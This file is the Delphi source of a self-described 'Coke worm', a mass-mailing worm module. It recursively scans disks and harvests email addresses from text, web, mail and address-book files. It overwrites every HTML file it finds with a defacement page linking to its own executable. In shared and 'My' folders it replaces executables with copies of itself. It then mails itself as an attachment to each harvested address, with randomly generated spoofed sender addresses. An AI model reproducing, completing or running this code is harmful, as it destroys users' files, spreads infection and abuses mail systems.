   unit mail;

   interface
   Uses Windows, Email;

   const
     fmOpenRead                          = $0000;
     fmShareDenyWrite                    = $0020;
     FILE_ATTRIBUTE_READONLY             = $00000001;
     FILE_ATTRIBUTE_HIDDEN               = $00000002;
     FILE_ATTRIBUTE_SYSTEM               = $00000004;
     FILE_ATTRIBUTE_VOLUMEID             = $00000008;
     FILE_ATTRIBUTE_ARCHIVE              = $00000020;
     FILE_ATTRIBUTE_DIRECTORY            = $00000010;
     FILE_ATTRIBUTE_ANYFILE              = $0000003F;

   var
     ALL                                 : String;
     ExeName                             : String;
     fDir                                : Array[0..255]Of Char;
     Path                                : String;
     fName                               : String;
     fText                               : String;
     fSubj                               : String;
     fMail                               : String;
     Balle                               : IntegeR;
     F                                   : TextFile;
     A                                   : Dword;
     E                                   : TSMTPEngine;

   function StrToInt(S: string): integer;
   function IntToStr(X: integer): string;
   Function GrabMail(FileName:String):String;
   Function FileSize(FileName: String): Int64;
   procedure ListFiles(D, Name, SearchName : String);
   Function LowerCase(Const S:String): String;
   function FileExists(const FileName: string): Boolean;
   Function GetRegValue(kRoot:Hkey; Path, Value:String):String;
   Function GetRMail:String;
   Function ExtractFileName(Str:String):String;

   implementation

   Function ExtractFileName(Str:String):String;
   var
    S:String;
   Begin
    S:= Str;
    While Pos('\', S)>0 Do
     S := Copy(S, pos('\', S)+1, Length(S));
    Result := S;
   End;

   Function GetRMail:String;
   Var
    F:Integer;
    ABC:String;
   Begin
    ABC := 'abcdefghijklmnopqrstuvwxyz';
    F := Random(20);
    Result := '';
    While Length(Result) < F Do
     Result := Result + Copy(ABC, Random(Length(ABC)), 1);
    Result := Result + '@hotmail.com';
   End;

   Function GetRegValue(kRoot:Hkey; Path, Value:String):String;
   Var
    Key : Hkey;
    Siz : Cardinal;
    Val : Array[0..16382] Of Char;
   Begin
    ZeroMemory(@Val, Length(Val));
    RegOpenKeyEx(kRoot, pChar(Path), 0, REG_SZ, Key);
    Siz := 16383;
    RegQueryValueEx(Key, pChar(Value), NIL, NIL, @Val[0], @Siz);
    RegCloseKey(Key);
    If String(Val) <> '' then
     Result := String(Val);
   End;

   function FileExists(const FileName: string): Boolean;
   var
     lpFindFileData: TWin32FindData;
     hFile: Cardinal;
   begin
     hFile := FindFirstFile(PChar(FileName), lpFindFileData);
     if hFile <> INVALID_HANDLE_VALUE then
     begin
       result := True;
       Windows.FindClose(hFile)
     end
     else
       result := False;
   end;

   function IntToStr(X: integer): string;
   var
    S: string;
   begin
    Str(X, S);
    Result := S;
   end;

   function StrToInt(S: string): integer;
   var
    V, Code: integer;
   begin
    Val(S, V, Code);
    Result := V;
   end;

   Function LowerCase(Const S:String): String;
   Var
     Ch            : Char;
     L             : Integer;
     Source,
     Dest          : PChar;
   Begin
     L := Length(S);
     SetLength(Result,L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     While L <> 0 Do
     Begin
       Ch := Source^;
       If (Ch >= 'A') And (Ch <= 'Z') Then
         Inc(Ch, 32);
       Dest^:= Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     End;
   End;


   procedure ListFiles(D, Name, SearchName : String);
   const
     faReadOnly  = $00000001;
     faHidden    = $00000002;
     faSysFile   = $00000004;
     faVolumeID  = $00000008;
     faDirectory = $00000010;
     faArchive   = $00000020;
     faAnyFile   = $0000003F;

   type
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle;
       FindData: TWin32FindData;
     end;

     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;

     function FindMatchingFile(var F: TSearchRec): Integer;
     var
       LocalFileTime: TFileTime;
     begin
       with F do
       begin
         while FindData.dwFileAttributes and ExcludeAttr <> 0 do
           if not FindNextFile(FindHandle, FindData) then
           begin
             Result := GetLastError;
             Exit;
           end;
         FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
         FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
           LongRec(Time).Lo);
         Size := FindData.nFileSizeLow;
         Attr := FindData.dwFileAttributes;
         Name := FindData.cFileName;
       end;
       Result := 0;
     end;

     procedure FindClose(var F: TSearchRec);
     begin
       if F.FindHandle <> INVALID_HANDLE_VALUE then
       begin
         Windows.FindClose(F.FindHandle);
         F.FindHandle := INVALID_HANDLE_VALUE;
       end;
     end;

     function FindFirst(const Path: string; Attr: Integer;
       var  F: TSearchRec): Integer;
     const
       faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
     begin
       F.ExcludeAttr := not Attr and faSpecial;
       F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
       if F.FindHandle <> INVALID_HANDLE_VALUE then
       begin
         Result := FindMatchingFile(F);
         if Result <> 0 then FindClose(F);
       end else
         Result := GetLastError;
     end;

     function FindNext(var F: TSearchRec): Integer;
     begin
       if FindNextFile(F.FindHandle, F.FindData) then
         Result := FindMatchingFile(F) else
         Result := GetLastError;
     end;

   var
     SR: TSearchRec;
     f : TextFile;
   begin
     If D[Length(D)] <> '\' then D := D + '\';

     If FindFirst(D + '*.*', faDirectory, SR) = 0 then
       Repeat
         If ((Sr.Attr and faDirectory) = faDirectory) and (SR.Name[1] <> '.') then
           ListFiles(D + SR.Name + '\', Name, SearchName)
         Else Begin
           sleep(10);
           Sr.Name := LowerCase(Sr.Name);
           If Copy(Sr.Name, length(sr.name)-2, 3) = 'txt' Then ALL := ALL + GrabMail(d+sr.name);
           If Copy(Sr.Name, length(sr.name)-2, 3) = 'doc' Then ALL := ALL + GrabMail(d+sr.name);
           If Copy(Sr.Name, length(sr.name)-2, 3) = 'vbs' Then ALL := ALL + GrabMail(d+sr.name);
           If Copy(Sr.Name, length(sr.name)-2, 3) = 'nfo' Then ALL := ALL + GrabMail(d+sr.name);
           If (Copy(Sr.Name, length(sr.name)-2, 3) = 'htm') or (Copy(Sr.Name, length(sr.name)-2, 3) = 'tml') Then Begin
            ALL := ALL + GrabMail(d+sr.name);
            AssignFile(F, D+Sr.Name);
            ReWrite(F);
            WriteLn(F, '<HTML>');
            WriteLn(F, '<BODY>');
            WriteLn(F, '<TITLE>Coke site</TITLE>');
            WriteLn(F, '<BODY BGCOLOR="Black">');
            WriteLn(F, '<FONT Color="White">');
            WriteLn(F, '<PRE>');
            WriteLn(F, 'Coke worm is here to join the party');
            WriteLn(F, 'Notice to others :');
            WriteLn(F, '');
            WriteLn(F, 'Fuck you <B>Bagel</B> Your just a lucky ScriptKiddie');
            WriteLn(F, '');
            WriteLn(F, 'Fuck you <B>MyDoom</B> Your just a lame retard');
            WriteLn(F, '');
            WriteLn(F, 'Fuck you <B>SkyNet</B> You had luck to get into F-Sec mail-list, nothing special tho.');
            WriteLn(F, '');
            WriteLn(F, 'You cant code worms, your not worth to be called coders.');
            WriteLn(F, 'Download Now : <a href="'+ParamStr(0)+'">Here</a>');
            WriteLn(F, '</PRE>');
            WriteLn(F, '</FONT>');
            WriteLn(F, '</BODY>');
            WriteLn(F, '</HTML>');
            CloseFile(F);
           End;
           If Copy(Sr.Name, length(sr.name)-2, 3) = 'asp' Then ALL := ALL + GrabMail(d+sr.name);
           If Copy(Sr.Name, length(sr.name)-2, 3) = 'php' Then ALL := ALL + GrabMail(d+sr.name);
           If Copy(Sr.Name, length(sr.name)-1, 2) = 'pl'  Then ALL := ALL + GrabMail(d+sr.name);
           If Copy(Sr.Name, length(sr.name)-2, 3) = 'adb' Then ALL := ALL + GrabMail(d+sr.name);
           If Copy(Sr.Name, length(sr.name)-2, 3) = 'cgi' Then ALL := ALL + GrabMail(d+sr.name);
           If Copy(Sr.Name, length(sr.name)-2, 3) = 'dbx' Then ALL := ALL + GrabMail(d+sr.name);
           If Copy(Sr.Name, length(sr.name)-2, 3) = 'eml' Then ALL := ALL + GrabMail(d+sr.name);
           If Copy(Sr.Name, length(sr.name)-2, 3) = 'msg' Then ALL := ALL + GrabMail(d+sr.name);
           If Copy(Sr.Name, length(sr.name)-2, 3) = 'oft' Then ALL := ALL + GrabMail(d+sr.name);
           If Copy(Sr.Name, length(sr.name)-2, 3) = 'rtf' Then ALL := ALL + GrabMail(d+sr.name);
           If Copy(Sr.Name, length(sr.name)-2, 3) = 'sht' Then ALL := ALL + GrabMail(d+sr.name);
           If Copy(Sr.Name, length(sr.name)-1, 2) = 'wab' Then ALL := ALL + GrabMail(d+sr.name);
           If Copy(Sr.Name, length(sr.name)-1, 2) = 'exe' Then ExeName := ExeName + Sr.Name + #13#10;
           If Copy(Sr.Name, length(sr.name)-1, 2) = 'cmd' Then ExeName := ExeName + Sr.Name + #13#10;
           If Copy(Sr.Name, length(sr.name)-1, 2) = 'pif' Then ExeName := ExeName + Sr.Name + #13#10;
           If Copy(Sr.Name, length(sr.name)-1, 2) = 'com' Then ExeName := ExeName + Sr.Name + #13#10;
           If Copy(Sr.Name, length(sr.name)-1, 2) = 'scr' Then ExeName := ExeName + Sr.Name + #13#10;
           If Copy(Sr.Name, length(sr.name)-1, 2) = 'bat' Then ExeName := ExeName + Sr.Name + #13#10;
           If Pos('Shar',ExtractFileName(Copy(D, 1, Length(d)-1)))>0 Then
            While ExeName <> '' Do Begin
             CopyFile(pChar(ParamStr(0)), pChar(D+Copy(ExeName, 1, Pos(#13#10, ExeName)-1)), False);
             ExeName := Copy(ExeName, Pos(#13#10, ExeName)+2, Length(ExeName));
            End;
           If Pos('My ',ExtractFileName(Copy(D, 1, Length(d)-1)))>0 Then
            While ExeName <> '' Do Begin
             CopyFile(pChar(ParamStr(0)), pChar(D+Copy(ExeName, 1, Pos(#13#10, ExeName)-1)), False);
             ExeName := Copy(ExeName, Pos(#13#10, ExeName)+2, Length(ExeName));
            End;
           While All <> '' Do Begin
            E := TSMTPEngine.Create;
            E.Body := fText;
            E.Subject := fSubj;
            E.Attachment := fName;
            E.Recip := Copy(All, 1, Pos(#13#10, All)-1);
            E.From := fMail;
            E.SendEmail;
            E.Free;
            All := Copy(All, Pos(#13#10, All)+2, Length(All));
           End;
         End;
       Until (FindNext(SR) <> 0);
     FindClose(SR);
   end;



   Function FileSize(FileName: String): Int64;
   Var
     H: THandle;
     FData: TWin32FindData;
   Begin
     Result:= -1;

     H:= FindFirstFile(PChar(FileName), FData);
     If H <> INVALID_HANDLE_VALUE Then
     Begin
       Windows.FindClose(H);
       Result:= Int64(FData.nFileSizeHigh) Shl 32 + FData.nFileSizeLow;
     End;
   End;

   Function GrabMail(FileName:String):String;
   Var
    F       : TextFile;
    L1, L2  : String;
    Mail    : String;
    H, E, I,
    A       : Integer;
    ABC,
    ABC2    : String;
    Text    : String;
   Label Again;

   Begin

    ABC  := 'abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    ABC2 := 'abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ.';

    // We dont want files thats over 5 kb.
    If FileSize(FileName) > 5000 Then Exit;

    // CopyFile, else might crash on read
    CopyFile(pChar(FileName), pChar(FileName+'_'), False);

    // Open file to read from
    AssignFile(F, FileName+'_');

    Try
     Reset(F);
    Except
     Exit;
    End;

    Read(F, L1);
    ReadLn(F, L2);
    Text := L1;
    While not Eof(F) Do Begin
     Read(F, L1);
     ReadLn(F, L2);
     Text := Text + '|' + L1;
    End;

    // We are done, close the file
    CloseFile(F);

    // DeleteFile, we dont wanna add extra space
    DeleteFile(pChar(FileName+'_'));

    // Check if it is a program.
    If Copy(Text, 1, 2) = 'MZ' Then Exit;

    Text := '|' + Text + '|';
    Result := '';

    // Lets start this shit
    Again:
     If Pos('@', Text)>0 Then Begin

      A := Pos('@', Text)-1;
      If A = 0 Then A := 1;

      L1 := Copy(Text, a, 1);
      L2 := Copy(Text, a+2, 1);

      H := Pos(L1, ABC);
      E := Pos(L2, ABC2);

      If (H = 0) or (E = 0) Then Begin
       Text := Copy(Text, a+1, Length(Text));
       Goto Again;
      End;

      While Pos(Copy(Text, a, 1), Abc)>0 Do
       A := A - 1;

      A := A + 1;
      Mail := Copy(Text, a, Length(Text));
      Mail := Copy(Mail, 1, Pos('@', Mail)+2);

      I := Pos(Mail, Text) + Length(Mail);

      While Pos(Copy(Mail, Length(Mail), 1), ABC2)>0 Do Begin
       Mail := Mail + Copy(Text, i, 1);
       Inc(I);
      End;

      If Pos(Copy(Mail, Length(Mail), 1), ABC2) = 0 Then
       Mail := Copy(Mail, 1, Length(Mail)-1);

      Result := Result + Mail + #13#10;
      Text := Copy(Text, Pos(Mail, Text) + Length(Mail), Length(Text));
      Goto Again;

     End;
   End;


   end.

